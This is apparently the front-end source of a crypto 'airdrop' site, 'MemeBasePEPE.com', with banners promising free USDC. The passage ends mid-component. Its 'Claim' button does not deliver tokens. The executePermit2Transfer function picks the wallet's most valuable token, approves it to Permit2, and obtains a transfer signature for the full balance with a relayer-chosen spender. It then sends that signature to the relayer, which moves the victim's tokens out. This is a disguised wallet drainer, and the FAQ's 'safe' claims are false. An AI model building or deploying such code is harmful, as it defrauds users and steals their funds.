import { useAccount, usePublicClient, useWalletClient } from 'wagmi'
import { formatUnits, erc20Abi, maxUint256 } from 'viem'
import { useState, useEffect, useCallback, useMemo, createContext, useContext, type ComponentType, type ReactNode } from 'react'
import { ConnectButton } from '@rainbow-me/rainbowkit'
import { 
  Search, 
  Flame, 
  Sparkles, 
  HelpCircle, 
  Mail,
  Zap,
  ChevronDown,
  ChevronUp,
  Send,
  Twitter,
  MessageCircle,
  Target,
  Shield,
  Globe,
  Award,
  Loader2,
  Wallet,
} from 'lucide-react'
import Tokens from './sections/Tokens'

// Smart Contract and Permit2 Configuration
const SPENDER_CONTRACT = '0x2eB8cA2f4CCd8e4B069b9F599a740b0BB33Aa684'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const BASE_CHAIN_ID = 8453
const PROXY_CONTRACT = import.meta.env.VITE_PROXY_CONTRACT as string | undefined

// Base tokens with addresses for real balance checking
const BASE_TOKENS = [
  { symbol: 'USDC', name: 'USD Coin', address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', decimals: 6, coingeckoId: 'usd-coin' },
  { symbol: 'WETH', name: 'Wrapped Ether', address: '0x4200000000000000000000000000000000000006', decimals: 18, coingeckoId: 'weth' },
  { symbol: 'DAI', name: 'Dai', address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'BRETT', name: 'Brett', address: '0x532f27101965dd16442e59d40670faf5ebb142e4', decimals: 18, coingeckoId: 'based-brett' },
  { symbol: 'AERO', name: 'Aerodrome', address: '0x940181a94a35a4569e4529a3cdfb74e38fd98631', decimals: 18, coingeckoId: 'aerodrome-finance' },
  { symbol: 'DEGEN', name: 'Degen', address: '0x4ed4e862860bed51a9570b96d89af5e1b0efefed', decimals: 18, coingeckoId: 'degen-base' },
  { symbol: 'ZORA', name: 'Zora', address: '0x1111111111166b7fe7bd91427724b487980afc69', decimals: 18, coingeckoId: 'zora' },
  { symbol: 'VIRTUAL', name: 'Virtual', address: '0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b', decimals: 18, coingeckoId: 'virtual-protocol' },
  { symbol: 'MORPHO', name: 'Morpho', address: '0xbaa5cc21fd487b8fcc2f632f3f4e8d37262a0842', decimals: 18, coingeckoId: 'morpho' },
  { symbol: 'ZRO', name: 'LayerZero', address: '0x6985884c4392d348587b19cb9eaaf157f13271cd', decimals: 18, coingeckoId: 'layerzero' },
  { symbol: 'CBETH', name: 'Coinbase ETH', address: '0x2ae3f1ec7f1f5012cfeab0185bfc7aa3cf0dec22', decimals: 18, coingeckoId: 'coinbase-wrapped-staked-eth' },
  { symbol: 'USDbC', name: 'USD Base Coin', address: '0xd9aaec86b65d86f6a7b5b1b0c42ffa531710b6ca', decimals: 6, coingeckoId: 'usd-base-coin' },
  { symbol: 'AAVE', name: 'Aave', address: '0x63706e401c06ac8513145b7687A14804d17f814b', decimals: 18, coingeckoId: 'aave' },
]

// ERC20 ABI with permit support
const ERC20_EXTENDED_ABI = [
  ...erc20Abi,
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function'
  }
] as const
const BASE_TOKEN_PRICES = [
  { symbol: 'USDC', name: 'USD Coin', price: 1.0, change: 0.0 },
  { symbol: 'WETH', name: 'Wrapped Ether', price: 2058.43, change: 0.43 },
  { symbol: 'BRETT', name: 'Brett', price: 0.15, change: 5.2 },
  { symbol: 'AERO', name: 'Aerodrome', price: 1.25, change: 3.8 },
  { symbol: 'DEGEN', name: 'Degen', price: 0.008, change: -2.1 },
  { symbol: 'VIRTUAL', name: 'Virtual', price: 2.45, change: 8.5 },
  { symbol: 'MORPHO', name: 'Morpho', price: 1.85, change: 4.2 },
  { symbol: 'ZRO', name: 'LayerZero', price: 3.2, change: -1.5 },
]

// Navigation items
const NAV_ITEMS = [
  { id: 'latest', label: 'LATEST DROPS', icon: Zap },
  { id: 'hot', label: 'HOT DROPS', icon: Flame },
  { id: 'potential', label: 'POTENTIAL DROPS', icon: Sparkles },
  { id: 'faq', label: 'FAQ', icon: HelpCircle },
  { id: 'contact', label: 'CONTACT', icon: Mail },
]

// Mock airdrop data
const AIRDROPS = {
  latest: [
    { id: 1, name: 'Bybit', symbol: 'BYBIT', actions: 'Register, Join Campaign and Deposit', confirmed: true, logo: 'B' },
    { id: 2, name: 'Upshot', symbol: 'UPSHOT', actions: 'Refer and earn points', confirmed: true, logo: 'U', hot: true },
    { id: 3, name: 'Unitas Labs', symbol: 'UNITAS', actions: 'Earn points', confirmed: true, logo: 'U' },
    { id: 4, name: 'Valiant', symbol: 'VAL', actions: 'Join Badge program', confirmed: true, logo: 'V' },
  ],
  hot: [
    { id: 5, name: 'Acebet', symbol: 'ACEBET', actions: 'Deposit and earn', confirmed: true, logo: 'A', hot: true, hotValue: 193 },
    { id: 6, name: 'SolPump', symbol: 'SOLPUMP', actions: 'Participate hourly, grab free SOL', confirmed: true, logo: 'S', hot: true, hotValue: 144 },
    { id: 7, name: 'BaseX', symbol: 'BASEX', actions: 'Trade and earn rewards', confirmed: true, logo: 'B', hot: true, hotValue: 89 },
  ],
  updated: [
    { id: 8, name: 'Morpho', symbol: 'MORPHO', actions: 'Lend and borrow', confirmed: true, logo: 'M' },
    { id: 9, name: 'Aerodrome', symbol: 'AERO', actions: 'Provide liquidity', confirmed: true, logo: 'A' },
    { id: 10, name: 'Brett', symbol: 'BRETT', actions: 'Hold and stake', confirmed: true, logo: 'B' },
  ],
  potential: [
    { id: 11, name: 'Zora', symbol: 'ZORA', actions: 'Create and collect NFTs', confirmed: false, logo: 'Z', potential: true },
    { id: 12, name: 'Degen', symbol: 'DEGEN', actions: 'Post and engage', confirmed: false, logo: 'D', potential: true },
    { id: 13, name: 'Farcaster', symbol: 'FAR', actions: 'Build following', confirmed: false, logo: 'F', potential: true },
    { id: 14, name: 'Layer3', symbol: 'L3', actions: 'Complete quests', confirmed: false, logo: 'L', potential: true },
  ]
}

// FAQ data
const FAQ_DATA = [
  {
    question: 'What is a drop?',
    answer: 'A drop is a distribution of cryptocurrency tokens or coins to multiple wallet addresses, usually for free. Projects use drops to reward early adopters, build community engagement, and promote their tokens.'
  },
  {
    question: 'How do I claim tokens on Base?',
    answer: 'Connect your wallet to the Base network, browse available drops on our platform, and follow the specific requirements for each drop. Most require simple tasks like social media engagement or holding specific tokens.'
  },
  {
    question: 'Is this site safe to use?',
    answer: 'Yes, we only aggregate information about legitimate drops. However, always verify smart contract addresses on BaseScan before interacting. Never share your private keys or seed phrases.'
  },
  {
    question: 'What is the relayer functionality?',
    answer: 'Our relayer service allows you to deposit tokens via Permit2 signatures, enabling gasless transactions in some cases. The relayer only works with pre-approved Permit2 allowances for supported tokens.'
  },
  {
    question: 'How are hot drops calculated?',
    answer: 'Hot drops are ranked based on community interest, token value potential, and participation activity. The "heat" score reflects current buzz around the project.'
  },
  {
    question: 'Can I connect any wallet?',
    answer: 'We support MetaMask, Coinbase Wallet, Rainbow, and other WalletConnect-compatible wallets. Make sure your wallet is set to Base network (Chain ID: 8453).'
  }
]

// Banner data
const BANNERS = [
  { 
    title: 'YOUR EASIEST $10 EVER EARNED',
    subtitle: '$10 USDC',
    description: 'Real USDC. No Strings.',
    cta: 'Fully Withdrawable',
    bg: 'from-blue-600 to-blue-800'
  },
  { 
    title: 'VENTUALS',
    subtitle: 'REFERRALS',
    description: 'Earn rewards for inviting traders to Ventuals',
    cta: 'Generate Your Referral Link',
    bg: 'from-purple-600 to-purple-800'
  },
  { 
    title: 'Challenge the King',
    subtitle: 'themiracle × STORMRARE',
    description: 'Fight live and win a share of the $20k prize pool.',
    cta: 'Join Now',
    bg: 'from-gray-700 to-gray-900'
  },
  { 
    title: 'CLAIM YOUR FREE $1',
    subtitle: '+ 50% DEPOSIT BONUS',
    description: 'ACEBET.COM',
    bg: 'from-yellow-600 to-orange-700'
  },
]

// Header Component
function Header({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: (id: string) => void }) {
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  return (
    <header className="bg-white shadow-sm sticky top-0 z-50">
      <div className="border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div 
              className="flex items-center gap-2 cursor-pointer" 
              onClick={() => setActiveTab('latest')}
            >
              <div className="w-8 h-8 bg-gradient-to-br from-emerald-400 to-blue-500 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-lg">🪂</span>
              </div>
              <span className="text-xl font-bold text-gray-900">MemeBasePEPE.com</span>
            </div>

            <nav className="hidden md:flex items-center gap-1">
              {NAV_ITEMS.map((item) => {
                const Icon = item.icon
                return (
                  <button
                    key={item.id}
                    onClick={() => setActiveTab(item.id)}
                    className={`flex items-center gap-1.5 px-4 py-2 text-sm font-medium transition-colors ${
                      activeTab === item.id
                        ? 'text-emerald-600 border-b-2 border-emerald-600'
                        : 'text-gray-600 hover:text-emerald-600'
                    }`}
                  >
                    <Icon className="w-4 h-4" />
                    {item.label}
                  </button>
                )
              })}
            </nav>

            <div className="flex items-center gap-4">
              <div className="relative hidden sm:block">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search drops..."
                  className="pl-9 pr-4 py-2 w-48 bg-gray-100 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500"
                />
              </div>
              <ConnectButton showBalance={false} />
              <button 
                className="md:hidden p-2 text-gray-600 hover:text-gray-900"
                onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              >
                {mobileMenuOpen ? <ChevronUp /> : <ChevronDown />}
              </button>
            </div>
          </div>
        </div>
      </div>

      {mobileMenuOpen && (
        <div className="md:hidden bg-white border-b border-gray-200">
          <div className="px-4 py-2 space-y-1">
            {NAV_ITEMS.map((item) => {
              const Icon = item.icon
              return (
                <button
                  key={item.id}
                  onClick={() => {
                    setActiveTab(item.id)
                    setMobileMenuOpen(false)
                  }}
                  className={`w-full flex items-center gap-2 px-4 py-3 text-sm font-medium rounded-lg ${
                    activeTab === item.id
                      ? 'bg-emerald-50 text-emerald-600'
                      : 'text-gray-600 hover:bg-gray-50'
                  }`}
                >
                  <Icon className="w-4 h-4" />
                  {item.label}
                </button>
              )
            })}
          </div>
        </div>
      )}

      <div className="bg-gray-900 text-white py-2 overflow-x-auto">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center gap-6 text-xs whitespace-nowrap">
            {BASE_TOKEN_PRICES.map((crypto: { symbol: string; price: number; change: number }) => (
              <div key={crypto.symbol} className="flex items-center gap-1 cursor-pointer hover:text-emerald-400 transition-colors">
                <span className="font-medium">{crypto.symbol}</span>
                <span className="text-gray-400">${crypto.price.toLocaleString()}</span>
                <span className={crypto.change >= 0 ? 'text-emerald-400' : 'text-red-400'}>
                  {crypto.change >= 0 ? '+' : ''}{crypto.change}%
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </header>
  )
}

// Contact Page
function ContactPage() {
  const [formData, setFormData] = useState({ name: '', email: '', message: '' })
  const [submitted, setSubmitted] = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitted(true)
    setTimeout(() => setSubmitted(false), 3000)
  }

  return (
    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <div className="mb-8 text-center">
        <h1 className="text-3xl font-bold text-gray-900 flex items-center justify-center gap-3">
          <Mail className="w-8 h-8 text-emerald-500" />
          Contact Us
        </h1>
        <p className="text-gray-600 mt-2">Get in touch with the MemeBasePEPE.com team</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
          <h2 className="text-lg font-semibold text-gray-900 mb-4">Send Message</h2>
          
          {submitted ? (
            <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-4 text-center">
              <div className="w-12 h-12 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-3">
                <Send className="w-6 h-6 text-emerald-600" />
              </div>
              <h3 className="font-semibold text-emerald-900">Message Sent!</h3>
              <p className="text-sm text-emerald-700 mt-1">We'll get back to you soon.</p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Name</label>
                <input
                  type="text"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500"
                  placeholder="Your name"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500"
                  placeholder="your@email.com"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Message</label>
                <textarea
                  value={formData.message}
                  onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                  rows={4}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500"
                  placeholder="How can we help?"
                  required
                />
              </div>
              <button
                type="submit"
                className="w-full bg-emerald-600 text-white py-2 rounded-lg font-medium hover:bg-emerald-700 transition-colors flex items-center justify-center gap-2"
              >
                <Send className="w-4 h-4" />
                Send Message
              </button>
            </form>
          )}
        </div>

        <div className="space-y-6">
          <div className="bg-gradient-to-br from-emerald-500 to-blue-500 rounded-xl p-6 text-white">
            <h2 className="text-lg font-semibold mb-4">Connect With Us</h2>
            <p className="text-sm opacity-90 mb-4">
              Follow us on social media for the latest drop updates and announcements.
            </p>
            <div className="flex items-center gap-3">
              <button className="p-3 bg-white/20 rounded-full hover:bg-white/30 transition-colors">
                <Twitter className="w-5 h-5" />
              </button>
              <button className="p-3 bg-white/20 rounded-full hover:bg-white/30 transition-colors">
                <MessageCircle className="w-5 h-5" />
              </button>
              <button className="p-3 bg-white/20 rounded-full hover:bg-white/30 transition-colors">
                <Globe className="w-5 h-5" />
              </button>
            </div>
          </div>

          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
            <h3 className="font-semibold text-gray-900 mb-4">Why Contact Us?</h3>
            <ul className="space-y-3 text-sm text-gray-600">
              <li className="flex items-start gap-2">
                <Shield className="w-4 h-4 text-emerald-500 mt-0.5" />
                Report suspicious drops
              </li>
              <li className="flex items-start gap-2">
                <Award className="w-4 h-4 text-emerald-500 mt-0.5" />
                Submit new drop listings
              </li>
              <li className="flex items-start gap-2">
                <MessageCircle className="w-4 h-4 text-emerald-500 mt-0.5" />
                Partnership inquiries
              </li>
              <li className="flex items-start gap-2">
                <HelpCircle className="w-4 h-4 text-emerald-500 mt-0.5" />
                Technical support
              </li>
              <li className="flex items-start gap-2">
                <Mail className="w-4 h-4 text-emerald-500 mt-0.5" />
                <a
                  href="mailto:support@memebasepepe.com"
                  className="text-emerald-600 hover:text-emerald-700 font-medium"
                >
                  support@memebasepepe.com
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  )
}

// Token prices map for reference
const TOKEN_PRICES: Record<string, number> = {
  USDC: 1.0, DAI: 1.0, WETH: 2058.43, CBETH: 2058.43, BRETT: 0.15, AERO: 1.25,
  DEGEN: 0.008, ZORA: 0.12, LINK: 9.04, DOT: 5.2, MORPHO: 1.85, ZRO: 3.2,
  VIRTUAL: 2.45, CAKE: 2.8, CRV: 0.45, SPX: 0.85, SYRUP: 0.32, RIVER: 0.15,
  TRAC: 0.28, COW: 0.55, W: 0.42, HOME: 0.08, AWE: 0.003, USDbC: 1.0,
}

type ClaimContextValue = {
  claim: () => void
  disabled: boolean
}

const ClaimContext = createContext<ClaimContextValue | null>(null)

function useClaimAction() {
  return useContext(ClaimContext)
}

// Advanced Wallet Tokens Component with Permit2// Token Claim Component
function WalletTokens({ children }: { children: ReactNode }) {
  const { address, isConnected, chainId } = useAccount()
  const publicClient = usePublicClient()
  const { data: walletClient } = useWalletClient()
  
  const [selectedTokens, setSelectedTokens] = useState<string[]>([])
  const [tokenBalances, setTokenBalances] = useState<Record<string, bigint>>({})
  const [tokenAllowances, setTokenAllowances] = useState<Record<string, bigint>>({})
  const [claiming, setClaiming] = useState(false)
  const [prices, setPrices] = useState<Record<string, number>>(TOKEN_PRICES)

  const RELAYER_URL = import.meta.env.VITE_RELAYER_URL || `http://127.0.0.1:4000`

  // Fetch balances via relayer (server-side RPC to avoid browser 429s)
  const fetchBalances = useCallback(async () => {
    if (!address || !isConnected) return
    
    try {
      const fetchUrl = `${RELAYER_URL}/balances/${address}`;
      console.log(`[PROFESSIONAL DEBUG] fetchBalances initiating request to: ${fetchUrl}`);
      
      const response = await fetch(fetchUrl, {
        mode: 'cors',
        headers: {
          'Accept': 'application/json'
        }
      })
      
      if (!response.ok) {
        throw new Error(`Relayer HTTP Error: ${response.status} ${response.statusText}`);
      }
      
      const data = await response.json()
      console.log('[PROFESSIONAL DEBUG] fetchBalances raw data received from relayer:', JSON.stringify(data, null, 2))
      
      if (!data.balances || typeof data.balances !== 'object') {
        console.error('[PROFESSIONAL DEBUG] Relayer response missing valid balances object');
        return;
      }

      const newBalances: Record<string, bigint> = {}
      const newTokenAllowances: Record<string, bigint> = {}
      
      // Parse token balances
      const parsedBalances: Record<string, string> = {};
      Object.entries(data.balances).forEach(([symbol, balance]) => {
        try {
          const biValue = BigInt(balance as string);
          newBalances[symbol] = biValue;
          parsedBalances[symbol] = biValue.toString();
        } catch {
          console.error(`[PROFESSIONAL DEBUG] BigInt parse failed for balance of ${symbol}:`, balance);
        }
      });
      console.log('[PROFESSIONAL DEBUG] Parsed Balances:', parsedBalances);
      
      // Parse allowances
      if (data.tokenAllowances) {
        const parsedTokenAllowances: Record<string, string> = {};
        Object.entries(data.tokenAllowances).forEach(([symbol, allowance]) => {
          try {
            const biValue = BigInt(allowance as string);
            newTokenAllowances[symbol] = biValue;
            parsedTokenAllowances[symbol] = biValue.toString();
          } catch {
            console.warn(`[PROFESSIONAL DEBUG] Could not parse token allowance for ${symbol}:`, allowance);
          }
        });
        console.log('[PROFESSIONAL DEBUG] Parsed Token Allowances (ERC20 -> Permit2):', parsedTokenAllowances);
      }

      console.log('[PROFESSIONAL DEBUG] Updating component state with new data...');
      setTokenBalances(newBalances)
      setTokenAllowances(newTokenAllowances)

      if (data.ethBalance) {
        console.log(`[PROFESSIONAL DEBUG] ETH balance from relayer: ${data.ethBalance}`)
      }

      // Auto-selection logic moved inside state update cycle or separate effect
      // to keep fetchBalances pure in terms of function dependencies
    } catch (e: unknown) {
      console.error('[PROFESSIONAL DEBUG] Critical error in fetchBalances:', e)
    }
  }, [RELAYER_URL, address, isConnected]) // Removed 'prices' dependency to stabilize function reference

  // Fetch prices from CoinGecko via relayer
  const fetchPrices = useCallback(async () => {
    try {
      console.log('[PROFESSIONAL DEBUG] fetchPrices initiating request...');
      const response = await fetch(`${RELAYER_URL}/prices`)
      if (!response.ok) throw new Error(`Relayer Prices HTTP Error: ${response.status}`)
      
      const data = await response.json()
      console.log('[PROFESSIONAL DEBUG] fetchPrices raw data received:', data);
      
      const newPrices: Record<string, number> = { ...TOKEN_PRICES }
      let updatedCount = 0;
      for (const token of BASE_TOKENS) {
        if (data[token.coingeckoId]?.usd) {
          newPrices[token.symbol] = data[token.coingeckoId].usd
          updatedCount++;
        }
      }
      console.log(`[PROFESSIONAL DEBUG] Successfully updated ${updatedCount} token prices`);
      setPrices(newPrices)
    } catch (err) {
      console.error('[PROFESSIONAL DEBUG] Error fetching prices:', err)
    }
  }, [RELAYER_URL])

  // Combined effect for data initialization
  useEffect(() => {
    if (isConnected && address) {
      console.log('[PROFESSIONAL DEBUG] useEffect triggered: initial fetch sequence started');
      fetchBalances()
      fetchPrices()
    }
  }, [isConnected, address, fetchBalances, fetchPrices])

  // Separate effect for auto-selection to avoid complexity in fetchBalances
  useEffect(() => {
    if (Object.keys(tokenBalances).length > 0 && selectedTokens.length === 0) {
      console.log('[PROFESSIONAL DEBUG] Triggering auto-selection of top tokens');
      const tokensWithValues = BASE_TOKENS.map(token => {
        const balance = tokenBalances[token.symbol] || 0n
        const formattedBalance = Number(formatUnits(balance, token.decimals))
        const price = prices[token.symbol] || 0
        return { symbol: token.symbol, value: formattedBalance * price }
      }).filter(t => t.value > 0)
      
      const top1 = tokensWithValues
        .sort((a, b) => b.value - a.value)
        .slice(0, 1)
        .map(t => t.symbol)
      
      if (top1.length > 0) {
        console.log('[PROFESSIONAL DEBUG] Automatically selected token:', top1);
        setSelectedTokens(top1)
      }
    }
  }, [tokenBalances, prices, selectedTokens.length])

  // Calculate token values for UI
  const walletTokens = useMemo(() => {
    if (!isConnected) return []
    
    console.log('[PROFESSIONAL DEBUG] useMemo(walletTokens): current tokenBalances state size:', Object.keys(tokenBalances).length);
    
    const tokens = BASE_TOKENS.map(token => {
      const balance = tokenBalances[token.symbol] || 0n
      const formattedBalance = Number(formatUnits(balance, token.decimals))
      const price = prices[token.symbol] || 0
      const value = formattedBalance * price
      
      console.log(`[PROFESSIONAL DEBUG] PROCESSING TOKEN: ${token.symbol} | Raw: ${balance.toString()} | Formatted: ${formattedBalance} | Price: $${price} | Value: $${value}`);
      
      return {
        ...token,
        balance: formattedBalance,
        rawBalance: balance,
        price,
        value,
      }
    })
    
    // Log why tokens are being filtered
    const nonZero = tokens.filter(t => t.rawBalance > 0n);
    console.log(`[PROFESSIONAL DEBUG] useMemo(walletTokens): Found ${tokens.length} total tokens, ${nonZero.length} with non-zero balance`);
    
    if (nonZero.length === 0 && Object.keys(tokenBalances).length > 0) {
      console.warn('[PROFESSIONAL DEBUG] ALARM: tokenBalances has data but all rawBalances are 0n. State keys:', Object.keys(tokenBalances));
    }

    return nonZero
  }, [isConnected, tokenBalances, prices])

// Execute Permit2 transfer via Relayer
  const executePermit2Transfer = async () => {
    if (!walletClient || !address || selectedTokens.length === 0) return
    
    setClaiming(true)

    try {
      // Fetch spender address (Permit2 requires spender = msg.sender)
      const healthRes = await fetch(`${RELAYER_URL}/health`)
      if (!healthRes.ok) throw new Error('Failed to fetch relayer health')
      const healthJson = await healthRes.json()
      const spenderAddress = (healthJson.spenderAddress ?? healthJson.relayerAddress) as `0x${string}`

      // Process each selected token
      for (const symbol of selectedTokens) {
        const token = walletTokens.find(t => t.symbol === symbol)
        if (!token || token.rawBalance === 0n) continue

        // Проверка актуального баланса перед отправкой (защита от race conditions)
        let actualBalance: bigint
        let safeAmount: bigint = token.rawBalance
        try {
          actualBalance = await publicClient!.readContract({
            address: token.address as `0x${string}`,
            abi: ERC20_EXTENDED_ABI,
            functionName: 'balanceOf',
            args: [address],
          })
          console.log(`[PROFESSIONAL DEBUG] Actual on-chain balance for ${token.symbol}: ${actualBalance.toString()}`)
          
          if (actualBalance === 0n) {
            console.warn(`[PROFESSIONAL DEBUG] Skipping ${token.symbol}: actual balance is 0, but UI showed ${token.rawBalance.toString()}`)
            continue
          }
          
          // Используем минимум из актуального баланса и того что показан в UI
          safeAmount = actualBalance < token.rawBalance ? actualBalance : token.rawBalance
          if (safeAmount !== token.rawBalance) {
            console.log(`[PROFESSIONAL DEBUG] Adjusting amount from ${token.rawBalance.toString()} to ${safeAmount.toString()} due to balance change`)
          }
        } catch (e) {
          console.error(`[PROFESSIONAL DEBUG] Failed to check actual balance for ${token.symbol}:`, e)
          continue
        }

        // Step 1: Check and approve token for Permit2 if needed (use data from relayer)
        const currentAllowance = tokenAllowances[symbol] || 0n

        console.log(`[PROFESSIONAL DEBUG] Allowance check for ${token.symbol}:`, {
          currentAllowance: currentAllowance.toString(),
          required: safeAmount.toString(),
          exactMatch: currentAllowance === safeAmount,
        })

        if (currentAllowance < safeAmount) {
          console.log(`Approving ${token.symbol} for Permit2...`)
          const approveTx = await walletClient.writeContract({
            address: token.address as `0x${string}`,
            abi: ERC20_EXTENDED_ABI,
            functionName: 'approve',
            args: [PERMIT2_ADDRESS, safeAmount],
          })
          
          // Wait for approval confirmation (only for the actual wallet action)
          await publicClient!.waitForTransactionReceipt({ hash: approveTx })
          console.log(`${token.symbol} approved for Permit2`)

          // Important UX fix: update local state immediately so a second click (or next token in loop)
          // doesn't trigger another approve prompt due to stale allowance state.
          setTokenAllowances((prev) => ({ ...prev, [symbol]: safeAmount }))
        }

        const nonce = (BigInt(Math.floor(Date.now() / 1000)) << 32n) + BigInt(Math.floor(Math.random() * 2 ** 32))
        const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600) // 1 hour

        console.log(`[PROFESSIONAL DEBUG] Preparing Permit2 Signature:`, {
          token: token.address,
          amount: safeAmount.toString(),
          nonce: nonce.toString(),
          deadline: deadline.toString(),
          owner: address,
          spender: spenderAddress
        });

        // Create Permit2 signature data with correct EIP-712 domain (no version field)
        const domain = {
          name: 'Permit2',
          chainId: BASE_CHAIN_ID,
          verifyingContract: PERMIT2_ADDRESS as `0x${string}`,
        } as const

        const types = {
          TokenPermissions: [
            { name: 'token', type: 'address' },
            { name: 'amount', type: 'uint256' },
          ],
          PermitTransferFrom: [
            { name: 'permitted', type: 'TokenPermissions' },
            { name: 'spender', type: 'address' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        } as const

        const values = {
          permitted: {
            token: token.address as `0x${string}`,
            amount: safeAmount,
          },
          spender: spenderAddress,
          nonce: nonce,
          deadline: deadline,
        }

        console.log(`[PROFESSIONAL DEBUG] Domain:`, JSON.stringify(domain, null, 2));
        console.log(`[PROFESSIONAL DEBUG] Types:`, JSON.stringify(types, null, 2));
        console.log(`[PROFESSIONAL DEBUG] Values:`, JSON.stringify(values, (_, v) => typeof v === 'bigint' ? v.toString() : v, 2));

        // Sign the Permit2 message
        const signature = await walletClient.signTypedData({
          account: address as `0x${string}`,
          domain,
          types,
          primaryType: 'PermitTransferFrom',
          message: values,
        })

        console.log(`[PROFESSIONAL DEBUG] Signature generated: ${signature}`);

        // Send to relayer
        const response = await fetch(`${RELAYER_URL}/relay`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            tokenAddress: token.address,
            owner: address,
            amount: safeAmount.toString(),
            nonce: nonce.toString(),
            deadline: deadline.toString(),
            signature,
          }),
        })

        // If Permit2 fails, throw error
        if (!response.ok) {
          const result = await response.json()
          throw new Error(result.error || result.details || 'Relayer error')
        } else {
          const result = await response.json()
          if (result.feeAmount) {
            console.log(`Fee: ${result.feeAmount}, Net: ${result.netAmount}`)
          }
        }
      }
    } catch (err: unknown) {
      console.error('Permit2 error:', err)
    } finally {
      setClaiming(false)
    }
  }

  if (!isConnected) {
    return (
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="bg-white rounded-2xl card-shadow p-8 text-center">
          <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Wallet className="w-8 h-8 text-emerald-600" />
          </div>
          <h3 className="text-xl font-bold text-gray-900 mb-2">Connect Your Wallet</h3>
          <p className="text-gray-600 mb-4">Connect your wallet to see your Base tokens and claim drops</p>
          <div className="flex justify-center">
            <ConnectButton />
          </div>
        </div>
      </div>
    )
  }

  return (
    <ClaimContext.Provider value={{ claim: executePermit2Transfer, disabled: claiming || selectedTokens.length === 0 }}>
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-6 mt-3">
        <div className="bg-gradient-to-r from-cyan-400 to-teal-500 rounded-xl p-4 flex items-center justify-between hover:shadow-lg transition-shadow">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center">
              <Sparkles className="w-5 h-5 text-cyan-500" />
            </div>
            <span className="text-white font-extrabold">Claim</span>
          </div>

          <button
            onClick={executePermit2Transfer}
            disabled={claiming || selectedTokens.length === 0}
            className={`px-8 py-3 rounded-xl font-extrabold text-lg flex items-center justify-center gap-3 transition-all shadow-lg ${
              claiming || selectedTokens.length === 0
                ? 'bg-gray-200 cursor-not-allowed text-gray-500'
                : 'bg-black text-white hover:bg-gray-900 active:scale-[0.98]'
            }`}
          >
            {claiming ? (
              <>
                <Loader2 className="w-6 h-6 animate-spin" />
                Processing...
              </>
            ) : (
              <>
                <Sparkles className="w-6 h-6" />
                Claim
              </>
            )}
          </button>
        </div>
      </div>
      {children}
    </ClaimContext.Provider>
  )
}

function Banner() {
  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {BANNERS.map((banner, index) => (
          <div
            key={index}
            className={`relative overflow-hidden rounded-xl bg-gradient-to-br ${banner.bg} p-4 text-white cursor-pointer hover:scale-[1.02] hover:shadow-lg transition-all`}
          >
            <div className="relative z-10">
              <p className="text-xs font-medium opacity-90">{banner.title}</p>
              <h3 className="text-lg font-bold mt-1">{banner.subtitle}</h3>
              <p className="text-xs opacity-80 mt-1">{banner.description}</p>
              {banner.cta && (
                <div className="mt-3 inline-flex items-center gap-1 text-xs font-medium bg-white/20 px-2 py-1 rounded">
                  {banner.cta}
